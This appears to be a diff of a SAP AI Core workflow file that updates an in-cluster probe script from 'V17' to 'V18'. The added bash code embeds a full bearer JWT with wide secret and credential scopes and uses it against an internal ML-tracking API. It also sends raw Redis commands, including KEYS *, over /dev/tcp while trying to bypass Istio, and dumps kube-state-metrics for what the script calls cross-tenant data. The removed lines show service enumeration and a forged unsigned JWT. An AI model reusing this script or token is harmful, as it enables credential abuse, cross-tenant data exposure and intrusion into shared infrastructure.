@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "17.0.0"
+    ai.sap.com/version: "18.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,88 +24,88 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V17 KSM + ML-TRACKING PROBE ==="
+        echo "=== V18 ML-TRACKING + REDIS PROBE ==="
         
-        # === KUBE-STATE-METRICS (KSM) - THE P1 FINDING ===
-        echo "=== KSM PROBES ==="
+        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
+        JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJT...T8e2XAZ8wqNkZOn-vW6g"
+        FULL_JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTQuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTdjY2ZkMmVjNzgifQ.eyJzdWIiOiJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJpc3MiOiJodHRwczovL2NmLWFpY29yZS1zZWN1cml0eS1iYi0xNC5hdXRoZW50aWNhdGlvbi5ldTEwLmhhbmEub25kZW1hbmQuY29tL29hdXRoL3Rva2VuIiwiYXV0aG9yaXRpZXMiOlsiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VydmljZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRlcGxveW1lbnRzLmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9ucy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZG9ja2VycmVnaXN0cnlzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV2YWx1YXRpb25NZXRyaWNzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMuZG93bmxvYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLnByb21wdFRlbXBsYXRlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuY3JlYXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMucmVhZCIsInVhYS5yZXNvdXJjZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZWNyZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5hcnRpZmFjdHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubm9kZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnNjaGVkdWxlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5kZXBsb3ltZW50cy5wcmVkaWN0IiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5iYXRjaGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MuZGVsZXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm9iamVjdHN0b3Jlc2VjcmV0LmNyZWRlbnRpYWxzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5jb25maWd1cmF0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5rcGlzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlcG9zaXRvcmllcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLndyaXRlIl0sImNsaWVudF9pZCI6InNiLWFpY29yZS1iYi0xNCFiNjI3NTU0fGFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NCIsImF1ZCI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kZXBsb3ltZW50cy5sb2dzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMiLCJ1YWEiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXBvc2l0b3JpZXMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRhdGFzZXRzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0Lm1ldGEiLCJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmV4ZWN1dGlvbnMubG9ncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2RlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5vcmNoZXN0cmF0aW9uQ29uZmlncyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYmF0Y2hlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5vYmplY3RzdG9yZXNlY3JldC5jcmVkZW50aWFscyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5yZXNvdXJjZWdyb3VwIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRhYmxlcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5hcHBsaWNhdGlvbnMiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQua3BpcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuYXJ0aWZhY3RzIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcyIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMiXSwiZXh0X2F0dHIiOnsiZW5oYW5jZXIiOiJYU1VBQSIsInN1YmFjY291bnRpZCI6IjQ2NDQ5MDEzLTAzYjMtNGE2MC04YzJjLTVlOThmZDMwMzQ5OCIsInpkbiI6ImNmLWFpY29yZS1zZWN1cml0eS1iYi0xNCIsInNlcnZpY2VpbnN0YW5jZWlkIjoiYWljb3JlLWJiLTE0In0sInppZCI6IjQ2NDQ5MDEzLTAzYjMtNGE2MC04YzJjLTVlOThmZDMwMzQ5OCIsImdyYW50X3R5cGUiOiJjbGllbnRfY3JlZGVudGlhbHMiLCJhenAiOiJzYi1haWNvcmUtYmItMTQhYjYyNzU1NHxhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQiLCJzY29wZSI6WyJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnJlc291cmNlZ3JvdXAucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zZXJ2aWNlcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmRvY2tlcnJlZ2lzdHJ5c2VjcmV0LmNyZWRlbnRpYWxzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGFibGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuYXBwbGljYXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGVwbG95bWVudHMubG9ncy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5leGVjdXRpb25zLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZXhlY3V0aW9ucy5sb2dzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmxvZ3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kb2NrZXJyZWdpc3RyeXNlY3JldC5jcmVkZW50aWFscy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXZhbHVhdGlvbk1ldHJpY3MucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5kYXRhc2V0cy5kb3dubG9hZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MucHJvbXB0VGVtcGxhdGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5jcmVhdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLm9yY2hlc3RyYXRpb25Db25maWdzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVzb3VyY2Vncm91cC53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZGVwbG95bWVudHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2VjcmV0cy5yZWFkIiwidWFhLnJlc291cmNlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmFwcGxpY2F0aW9ucy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MubWV0cmljcy5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNlY3JldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmFydGlmYWN0cy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuY29uZmlndXJhdGlvbnMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5ub2Rlcy53cml0ZSIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3MuZXhlY3V0aW9uc2NoZWR1bGVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmV4ZWN1dGlvbnMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLnJlYWQiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmRlcGxveW1lbnRzLnByZWRpY3QiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuZGF0YXNldHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmJhdGNoZXMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQubWV0YS5yZWFkIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5ldmFsdWF0aW9uTWV0cmljcy5kZWxldGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQub2JqZWN0c3RvcmVzZWNyZXQuY3JlZGVudGlhbHMud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQuc2NlbmFyaW9zLmNvbmZpZ3VyYXRpb25zLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LmtwaXMucmVhZCIsImFpY29yZS14c3VhYS1zdGQhYjU2Mzc4NC5zY2VuYXJpb3Mub3JjaGVzdHJhdGlvbkNvbmZpZ3Mud3JpdGUiLCJhaWNvcmUteHN1YWEtc3RkIWI1NjM3ODQucmVwb3NpdG9yaWVzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5tZXRyaWNzLndyaXRlIiwiYWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0LnNjZW5hcmlvcy5wcm9tcHRUZW1wbGF0ZXMud3JpdGUiXSwiZXhwIjoxNzczNDczNTA4LCJpYXQiOjE3NzM0MzAzMDgsImp0aSI6Ijg1NjdkYWQxZTA1OTQxZDBiNmJiOTExYzliZTEwMjRhIiwicmV2X3NpZyI6IjQ5Njc1NzBkIiwiY2lkIjoic2ItYWljb3JlLWJiLTE0IWI2Mjc1NTR8YWljb3JlLXhzdWFhLXN0ZCFiNTYzNzg0In0.nIOksUsdmF4S6tdryve0na67gkTLbDJmEhvSC1h4Kf5qXWIMsTqhadRsTjUe-d1fiyrCAVKKDPTGBkX-9DUeHdQu9fMzdvmoeEPoX92iokn9rBBNpj34HtPnr9mNB3YVsbi8kDE88N6FS_wo7_7KLgKCcefkhjQcTx4aMRHPfrOubQe6hHuCnLxB6QHPN4yVh5ro0i52MlYeejdb732NtygvMIDA-HU2y0VCHpvzM4dBq1leh4cNRPH_q8EtpiSVQVOQ_qEZPI21HNr687JC-z0Dk1zR9tkmfC7QudbGYnafjG1eTscMtGSuCOdGgiAQSlT8e2XAZ8wqNkZOn-vW6g"
         
-        # Known KSM endpoints from prior runs
-        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.monitoring.svc.cluster.local:8080"           "kube-state-metrics.kube-system.svc.cluster.local:8080"; do
-          echo "--- KSM: $ksm_host ---"
-          RESP=$(curl -s --connect-timeout 5 "http://${ksm_host}/metrics" 2>&1 | head -c 3000)
-          BYTES=$(echo "$RESP" | wc -c)
-          echo "BYTES=$BYTES"
-          echo "$RESP" | head -30
-          echo "..."
+        # === ML TRACKING WITH REAL JWT ===
+        echo "=== ML-TRACKING WITH REAL JWT ==="
+        echo "--- Root ---"
+        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- /api/v1/metrics ---"
+        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- /api/v1/experiments ---"
+        curl -s --connect-timeout 5 "$TRACK/api/v1/experiments" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- /api/v1/runs ---"
+        curl -s --connect-timeout 5 "$TRACK/api/v1/runs" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo ""
+        
+        echo "--- /api/v1/info ---"
+        curl -s --connect-timeout 5 "$TRACK/api/v1/info" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
+        echo ""
+        
+        # Also try with different resource groups
+        echo "--- Different RG header ---"
+        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" \
+          -H "Authorization: Bearer $FULL_JWT" \
+          -H "AI-Resource-Group: default" 2>&1 | head -c 500
+        echo ""
+        
+        # === REDIS PROBES ===
+        echo "=== REDIS PROBES ==="
+        
+        for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
+          echo "--- Redis $REDIS_HOST ---"
+          
+          # Try direct TCP (bypass Istio if possible)
+          echo "TCP PING:"
+          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'PING\r' >&3 && sleep 1 && cat <&3 && exec 3>&-" 2>&1
+          echo ""
+          
+          echo "TCP INFO:"
+          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'INFO\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
+          echo ""
+          
+          echo "TCP KEYS:"
+          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'KEYS *\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
           echo ""
         done
         
-        # === KSM via direct IP (bypass DNS) ===
-        echo "=== KSM DIRECT IP ==="
-        # Resolve KSM DNS
-        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local"; do
-          IP=$(dig +short "$ksm_host" 2>/dev/null | head -1)
-          echo "DNS: $ksm_host = ${IP:-NXDOMAIN}"
-          if [ -n "$IP" ]; then
-            RESP=$(curl -s --connect-timeout 5 "http://${IP}:8080/metrics" 2>&1 | wc -c)
-            echo "  Direct IP: $RESP bytes"
-          fi
-        done
-        
-        # === ML TRACKING SERVICE ===
-        echo "=== ML TRACKING ==="
-        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
-        
-        # Try with execution ID as bearer token
-        echo "--- With execution ID as token ---"
-        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $AICORE_EXECUTION_ID" 2>&1 | head -c 300
-        echo ""
-        
-        # Try with tenant ID
-        echo "--- With tenant header ---"
-        curl -s --connect-timeout 5 "$TRACK/" -H "AI-Main-Tenant: $AI_MAIN_TENANT" -H "AI-Resource-Group: $AI_RESOURCE_GROUP" 2>&1 | head -c 300
-        echo ""
-        
-        # Try with a fabricated JWT-looking token
-        echo "--- With fake JWT ---"
-        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0." 2>&1 | head -c 300
-        echo ""
-        
-        # Try without auth (different paths)
-        echo "--- No auth paths ---"
-        for path in "/health" "/healthz" "/ready" "/readyz" "/metrics" "/swagger" "/api-docs" "/openapi.json" "/api/v1" "/api/v1/info" "/api/v1/health"; do
-          RESP=$(curl -s --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
-          [ -n "$RESP" ] && echo "  ${path}: ${RESP}"
-        done
-        
-        # === PROMETHEUS / GRAFANA DISCOVERY ===
-        echo "=== PROMETHEUS/GRAFANA ==="
-        for svc in prometheus-server prometheus grafana; do
-          for ns in monitoring opentelemetry platform-tests kube-system; do
-            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
-            [ -n "$IP" ] && {
-              echo "FOUND: ${svc}.${ns} = $IP"
-              curl -s --connect-timeout 3 "http://${IP}:9090/-/healthy" 2>&1 | head -c 200
-              curl -s --connect-timeout 3 "http://${IP}:3000/api/health" 2>&1 | head -c 200
-              echo ""
-            }
+        # Try redis-cli if available
+        which redis-cli 2>/dev/null && {
+          for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
+            echo "redis-cli $REDIS_HOST:"
+            redis-cli -h $REDIS_HOST PING 2>&1 | head -c 200
+            redis-cli -h $REDIS_HOST INFO server 2>&1 | head -c 500
+            echo ""
           done
-        done
+        } || echo "No redis-cli available"
         
-        # === OPENTELEMETRY SERVICES ===
-        echo "=== OPENTELEMETRY NS ==="
-        for svc in otel-collector jaeger zipkin fluentbit fluent-bit; do
-          IP=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
-          [ -n "$IP" ] && echo "FOUND: ${svc}.opentelemetry = $IP"
-        done
+        # === KSM FULL DUMP (pods - cross tenant data) ===
+        echo "=== KSM PODS SAMPLE ==="
+        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -E "^kube_pod_info" | head -30
+        echo ""
         
-        # === BROADER DNS ENUM ===
-        echo "=== EXPANDED DNS ==="
-        for svc in           "redis-master" "redis" "postgresql" "postgres" "mongodb" "mongo"           "elasticsearch" "es" "kibana" "logstash"           "vault" "consul" "minio" "s3"           "istio-ingressgateway" "istiod"           "nginx-ingress-controller" "traefik"           "aicore-server" "ai-launchpad" "user-management"; do
-          for ns in default istio-system istio-networking kube-system aicore argo cert-manager couchdb endpoint-service platform-tests connectivity-proxy user-management not-diamond fluent-bit; do
-            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
-            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
-          done
-        done
+        # Count unique namespaces from KSM
+        echo "=== NAMESPACE COUNT ==="
+        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -oP 'namespace="[^"]+"' | sort -u
+        echo ""
         
-        echo "=== V17 COMPLETE ==="
+        # === OTEL COLLECTOR ===
+        echo "=== OTEL COLLECTOR ==="
+        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/tracez" 2>&1 | head -c 500
+        echo ""
+        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/servicez" 2>&1 | head -c 500
+        echo ""
+        curl -s --connect-timeout 5 "http://100.109.242.36:8888/metrics" 2>&1 | head -c 500
+        echo ""
+        
+        echo "=== V18 COMPLETE ==="
